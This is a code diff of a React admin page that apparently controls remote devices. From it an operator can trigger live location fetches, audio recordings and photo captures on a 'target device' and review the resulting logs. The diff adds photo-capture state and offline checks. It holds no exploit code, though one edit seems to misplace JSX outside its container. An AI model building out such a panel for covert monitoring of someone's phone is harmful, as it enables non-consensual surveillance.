@@ -8,7 +8,7 @@ import EditDeviceForm from "./components/EditDeviceForm";
 import LiveMapTab from "./components/LiveMapTab";
 import CommandPanel from "./components/CommandPanel";
 import PromoteToAdminButton from "./components/PromoteToAdminButton";
-import { ArrowLeft, MapPin, Shield, Smartphone, Mail, Camera,Mic, Navigation } from "lucide-react";
+import { ArrowLeft, MapPin, Shield, Smartphone, Mail, Camera,Mic, Navigation, Loader2 } from "lucide-react";
 import MediaLogsTab from "./components/MediaLogsTab";
 import { useQueryClient } from "@tanstack/react-query";
 import { useEffect } from "react"; 
@@ -16,8 +16,9 @@ import { useSocket } from "../../context/SocketContext";
 
 export default function DeviceDetailPage() {
   const { id } = useParams();
-  const [tab, setTab] = useState("location");
+  const [tab, setTab] = useState("live-map");
   const [isRecordingAudio, setIsRecordingAudio] = useState(false);
+  const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
   const queryClient = useQueryClient();
   const { data, isLoading, isError } = useDeviceHistory(id);
   const socket = useSocket();
@@ -47,6 +48,11 @@ useEffect(() => {
     if (targetMongoId === currentMongoId) {
       setIsOnline(Boolean(payload.isOnline));
     }
+    if (!payload.isOnline) {
+          setIsFetchingLocation(false);
+          setIsCapturingPhoto(false);
+          setIsRecordingAudio(false);
+        }
   };
 
   const handleLiveLocationUpdate = (payload) => {
@@ -66,17 +72,36 @@ useEffect(() => {
     const status = String(payload?.status || payload?.commandStatus || payload?.state || "").toLowerCase();
     const action = String(payload?.action || payload?.commandType || payload?.type || payload?.command || "").toLowerCase();
 
-    // 💡 FIX 2: Live Location fetching status check
     if (action.includes("location") || action.includes("fetch")) {
-      setIsFetchingLocation(true);
-    }
+        if (!isOnline) {
+          setIsFetchingLocation(false);
+          alert("Cannot fetch live location: Target device is currently offline.");
+          return;
+        }
+        setIsFetchingLocation(true);
+      }
 
-    const isAudioAction = action.includes("audio") || action.includes("record");
-    const isActiveStatus = ["recording", "pending", "sent", "started", "processing"].includes(status);
+      const isAudioAction = action.includes("audio") || action.includes("record");
+      const isPhotoAction = action.includes("photo") || action.includes("capture");
+      const isActiveStatus = ["recording", "pending", "sent", "started", "processing"].includes(status);
+    
+      if (isAudioAction && isActiveStatus) {
+        if (!isOnline) {
+          setIsRecordingAudio(false);
+          alert("Cannot record audio: Target device is currently offline.");
+          return;
+        }
+        setIsRecordingAudio(true);
+      }
 
-    if (isAudioAction && isActiveStatus) {
-      setIsRecordingAudio(true);
-    }
+      if (isPhotoAction && isActiveStatus) {
+        if (!isOnline) {
+          setIsCapturingPhoto(false);
+          alert("Cannot capture photo: Target device is currently offline.");
+          return;
+        }
+        setIsCapturingPhoto(true);
+      }
   };
 
   const handleResultUpdate = (payload) => {
@@ -86,8 +111,8 @@ useEffect(() => {
     const isFinished = ["executed", "completed", "failed", "success", "done"].includes(status);
 
     if (isFinished) {
-      setIsRecordingAudio(false);
-      setIsFetchingLocation(false);
+      setIsRecordingAudio(false); 
+      setIsCapturingPhoto(false);
       queryClient.invalidateQueries(["deviceHistory", id]);
     }
   };
@@ -109,7 +134,7 @@ useEffect(() => {
     socket.off("device-status-changed", handleDeviceStatusChange);
     socket.off("admin-live-location-update", handleLiveLocationUpdate);
   };
-}, [id, queryClient, socket, data?.device?._id]);
+}, [id, queryClient, socket, data?.device?._id,isOnline]);
  
 if (isLoading) {
     return (
@@ -127,7 +152,7 @@ if (isLoading) {
     );
   }
 
-  const { device, locationHistory = [], permissionHistory = [] ,mediaLogs = []} = data;
+  const { device ,mediaLogs = [], locationHistory = [], permissionHistory = [] } = data;
   
   const photoLogs = mediaLogs.filter((item) => 
     item.mediaType === "photo" || 
@@ -200,17 +225,37 @@ if (isLoading) {
           {/* Quick Remote Commands */}
           <CommandPanel 
               deviceId={device._id}
+              isOnline={isOnline}
+              permissions={device?.permissions}
               onTabChange={setTab} 
               onCommandSent={(commandType) => {
-                if (commandType === "record_audio" || commandType === "AUDIO_RECORDING") {
-                  setIsRecordingAudio(true);
-                }
+                if (!isOnline) {
+                alert("Device is offline. Command cannot be processed in real-time.");
+                return;
+              }
+              const lowerCmd = String(commandType || "").toLowerCase();
+
+              if (lowerCmd.includes("audio")) {
+                setIsRecordingAudio(true);
+              } else if (lowerCmd.includes("photo") || lowerCmd.includes("capture")) {
+                setIsCapturingPhoto(true);
+                setTab("photos"); // Auto switch to photos tab
+              } else if (lowerCmd.includes("location")) {
+                setIsFetchingLocation(true);
+                setTab("live-map");
+              }
               }}
             />
 
-
-          {/* Real-time Audio Recording Alert Banner */}
-          {isRecordingAudio && (
+          {isCapturingPhoto && (
+            <div className="flex items-center gap-3 p-3.5 bg-blue-50 border border-blue-200 text-blue-800 rounded-xl text-xs animate-pulse">
+              <Loader2 className="h-4 w-4 animate-spin text-blue-600" />
+              <span>
+                <strong>Sending Capture Request:</strong> Camera command sent to device. Photos will automatically refresh upon upload.
+              </span>
+            </div>
+          )}
+         {isRecordingAudio && (
             <div className="flex items-center gap-3 p-3.5 bg-amber-50 border border-amber-200 text-amber-800 rounded-xl text-xs animate-pulse">
               <span className="relative flex h-2.5 w-2.5">
                 <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
@@ -237,6 +282,28 @@ if (isLoading) {
               </button>
 
               <button
+                onClick={() => setTab("photos")}
+                className={`flex items-center gap-2 px-5 py-3 text-xs font-bold transition border-b-2 ${
+                  tab === "photos"
+                    ? "border-blue-600 text-blue-600 bg-white"
+                    : "border-transparent text-slate-500 hover:text-slate-700"
+                }`}
+              >
+                <Camera size={15} /> Photos ({photoLogs.length})
+              </button>
+
+              <button
+                onClick={() => setTab("audio")}
+                className={`flex items-center gap-2 px-5 py-3 text-xs font-bold transition border-b-2 ${
+                  tab === "audio"
+                    ? "border-blue-600 text-blue-600 bg-white"
+                    : "border-transparent text-slate-500 hover:text-slate-700"
+                }`}
+              >
+                <Mic size={15} /> Audio ({audioLogs.length})
+              </button>
+
+              <button
                 onClick={() => setTab("location")}
                 className={`flex items-center gap-2 px-5 py-3 text-xs font-bold transition border-b-2 ${
                   tab === "location"
@@ -258,36 +325,16 @@ if (isLoading) {
                 <Shield size={15} /> Permission Changes ({permissionHistory.length})
               </button>
 
-              <button
-                onClick={() => setTab("photos")}
-                className={`flex items-center gap-2 px-5 py-3 text-xs font-bold transition border-b-2 ${
-                  tab === "photos"
-                    ? "border-blue-600 text-blue-600 bg-white"
-                    : "border-transparent text-slate-500 hover:text-slate-700"
-                }`}
-              >
-                <Camera size={15} /> Photos ({photoLogs.length})
-              </button>
-
-              <button
-                onClick={() => setTab("audio")}
-                className={`flex items-center gap-2 px-5 py-3 text-xs font-bold transition border-b-2 ${
-                  tab === "audio"
-                    ? "border-blue-600 text-blue-600 bg-white"
-                    : "border-transparent text-slate-500 hover:text-slate-700"
-                }`}
-              >
-                <Mic size={15} /> Audio ({audioLogs.length})
-              </button>
+              
             </div>
 
             {/* Tab Body */}
             <div className="p-5">
-              {tab === "live-map" && <LiveMapTab liveCoords={liveCoords} isFetching={isFetchingLocation} />}
-                {tab === "location" && <LocationHistoryTab history={locationHistory} />}
-                {tab === "permissions" && <PermissionHistoryTab history={permissionHistory} />}
+                {tab === "live-map" && <LiveMapTab liveCoords={liveCoords} isFetching={isFetchingLocation} />}
                 {tab === "photos" && <MediaLogsTab mediaLogs={photoLogs} filterType="photo" />}
                 {tab === "audio" && <MediaLogsTab mediaLogs={audioLogs} filterType="audio" />} </div>
+                {tab === "location" && <LocationHistoryTab history={locationHistory} />}
+                {tab === "permissions" && <PermissionHistoryTab history={permissionHistory} />}
             </div>
         </div>
 
